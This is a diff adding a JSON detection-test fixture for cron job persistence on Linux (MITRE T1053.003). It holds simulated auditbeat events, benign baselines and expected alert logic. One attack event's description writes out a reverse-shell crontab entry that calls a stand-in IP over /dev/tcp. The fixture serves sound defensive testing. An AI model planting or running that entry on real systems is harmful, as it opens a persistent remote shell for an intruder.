@@ -1,0 +1,168 @@
+{
+  "technique_id": "T1053.003",
+  "technique_name": "Cron Job Persistence (Linux)",
+  "description": "Simulates attacker-controlled crontab modification to establish persistence on a Linux host via a reverse shell entry.",
+  "platform": "linux",
+  "mitre_tactic": "persistence",
+  "events": {
+    "attack_sequence": [
+      {
+        "@timestamp": "{{now}}",
+        "event": {
+          "category": "process",
+          "type": "start",
+          "kind": "event",
+          "module": "auditd",
+          "dataset": "auditd.log"
+        },
+        "agent": { "type": "auditbeat" },
+        "host": {
+          "name": "LNX-WEB-01",
+          "os": { "family": "linux", "platform": "ubuntu" }
+        },
+        "process": {
+          "name": "crontab",
+          "executable": "/usr/bin/crontab",
+          "args": ["-e"],
+          "command_line": "crontab -e",
+          "pid": 31337,
+          "parent": { "name": "bash", "pid": 30001 }
+        },
+        "user": { "name": "root", "id": "0" },
+        "auditd": {
+          "log": { "record_type": "SYSCALL" },
+          "data": { "syscall": "execve" }
+        },
+        "_simulation": {
+          "type": "attack",
+          "technique": "T1053.003",
+          "platform": "linux",
+          "expected_match": true,
+          "sequence_order": 1,
+          "sequence_total": 2,
+          "description": "root edits crontab directly — precursor to cron persistence entry"
+        }
+      },
+      {
+        "@timestamp": "{{now}}",
+        "event": {
+          "category": "file",
+          "type": "change",
+          "kind": "event",
+          "module": "auditd",
+          "dataset": "auditd.log",
+          "action": "opened-file"
+        },
+        "agent": { "type": "auditbeat" },
+        "host": {
+          "name": "LNX-WEB-01",
+          "os": { "family": "linux", "platform": "ubuntu" }
+        },
+        "file": {
+          "path": "/var/spool/cron/crontabs/root",
+          "name": "root",
+          "directory": "/var/spool/cron/crontabs"
+        },
+        "process": {
+          "name": "crontab",
+          "executable": "/usr/bin/crontab",
+          "pid": 31337
+        },
+        "user": { "name": "root", "id": "0" },
+        "auditd": {
+          "log": { "record_type": "PATH" },
+          "data": { "syscall": "open" }
+        },
+        "_simulation": {
+          "type": "attack",
+          "technique": "T1053.003",
+          "platform": "linux",
+          "expected_match": true,
+          "sequence_order": 2,
+          "sequence_total": 2,
+          "description": "Crontab file for root written — reverse shell added: * * * * * /bin/bash -i >& /dev/tcp/203.0.113.50/4444 0>&1"
+        }
+      }
+    ],
+    "benign_similar": [
+      {
+        "@timestamp": "{{now}}",
+        "event": {
+          "category": "process",
+          "type": "start",
+          "kind": "event",
+          "module": "auditd",
+          "dataset": "auditd.log"
+        },
+        "agent": { "type": "auditbeat" },
+        "host": {
+          "name": "LNX-APP-01",
+          "os": { "family": "linux", "platform": "ubuntu" }
+        },
+        "process": {
+          "name": "crontab",
+          "executable": "/usr/bin/crontab",
+          "args": ["-l"],
+          "command_line": "crontab -l",
+          "pid": 11111,
+          "parent": { "name": "bash", "pid": 10000 }
+        },
+        "user": { "name": "deploy", "id": "1002" },
+        "auditd": {
+          "log": { "record_type": "SYSCALL" },
+          "data": { "syscall": "execve" }
+        },
+        "_simulation": {
+          "type": "baseline",
+          "technique": "T1053.003",
+          "platform": "linux",
+          "expected_match": false,
+          "description": "Non-root user listing their crontab — normal DevOps activity"
+        }
+      },
+      {
+        "@timestamp": "{{now}}",
+        "event": {
+          "category": "process",
+          "type": "start",
+          "kind": "event",
+          "module": "auditd",
+          "dataset": "auditd.log"
+        },
+        "agent": { "type": "auditbeat" },
+        "host": {
+          "name": "LNX-APP-01",
+          "os": { "family": "linux", "platform": "ubuntu" }
+        },
+        "process": {
+          "name": "apt-get",
+          "executable": "/usr/bin/apt-get",
+          "args": ["install", "-y", "nginx"],
+          "command_line": "apt-get install -y nginx",
+          "pid": 22222,
+          "parent": { "name": "bash", "pid": 20000 }
+        },
+        "user": { "name": "root", "id": "0" },
+        "auditd": {
+          "log": { "record_type": "SYSCALL" },
+          "data": { "syscall": "execve" }
+        },
+        "_simulation": {
+          "type": "baseline",
+          "technique": "T1053.003",
+          "platform": "linux",
+          "expected_match": false,
+          "description": "Package manager install — normal system administration"
+        }
+      }
+    ]
+  },
+  "expected_detection": {
+    "should_alert_on": "attack_sequence",
+    "should_not_alert_on": "benign_similar",
+    "key_fields": ["process.name", "process.args", "file.path", "user.name"],
+    "notes": "Alert on crontab -e by root OR writes to /var/spool/cron/crontabs/. Exclude crontab -l (read-only) and non-root non-system users modifying their own crontabs."
+  },
+  "log_sources_used": ["auditbeat"],
+  "platforms": ["linux"]
+}
